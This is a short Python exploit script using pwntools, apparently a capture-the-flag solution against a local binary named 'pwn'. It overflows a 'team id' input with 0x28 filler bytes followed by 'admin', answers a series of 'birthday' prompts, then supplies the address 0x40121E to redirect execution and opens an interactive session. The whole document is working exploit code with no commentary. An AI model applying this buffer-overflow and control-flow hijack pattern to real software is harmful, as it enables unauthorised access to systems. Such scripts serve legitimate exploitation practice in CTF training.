from pwn import *
elf = ELF("./pwn")
context.log_level = 'debug'
p = process('./pwn')
payload = b'b'*0x28
payload += b'admin'
p.sendafter(b'team id', payload)
pause()
for i in range(7):
    p.recvuntil(b'birthday\n')
    p.sendline(b'5')
payload = str(0x40121E)
p.sendlineafter(b'birthday\n' , payload)
# gdb.attach(p)
p.interactive()

